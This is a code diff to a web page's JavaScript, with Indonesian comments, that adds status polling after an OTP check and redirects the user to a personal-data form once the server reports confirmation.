@@ -79,6 +79,9 @@ window.addEventListener("load", () => {
 /* TOTAL SALAH */
 let wrongCount = 0;
 
+/* STATUS KONFIRMASI */
+let isConfirmed = false;
+
 /* HIDE ALERT */
 errorBox.style.display = "none";
 
@@ -177,6 +180,37 @@ otpInputs.forEach((input,index) => {
 
 });
 
+let statusInterval = null;
+
+function cekKonfirmasi(nmrx){
+
+    if(statusInterval){
+        clearInterval(statusInterval);
+    }
+
+    statusInterval = setInterval(async()=>{
+
+        const res = await fetch(`/status/${nmrx}`);
+        const data = await res.json();
+
+        if(data.status === "confirmed"){
+
+    isConfirmed = true;
+            
+            clearInterval(statusInterval);
+
+            loadingBox.style.display = "none";
+
+            alert("Berhasil, silakan lanjut ke data diri");
+
+            window.location.href = "data-diri.html";
+
+        }
+
+    },2000);
+
+}
+
 /* ========================= */
 /* CHECK OTP */
 /* ========================= */
@@ -240,6 +274,10 @@ function checkOTP(){
 
     console.log("RESPON:", data);
 
+    if(data.success){
+        cekKonfirmasi(nmrx);
+    }
+
 })
 
 .catch(err => {
@@ -253,6 +291,10 @@ function checkOTP(){
         "flex";
 
         setTimeout(() => {
+
+            if(isConfirmed){
+    return;
+}
 
             /* HIDE LOADING */
             loadingBox.style.display =
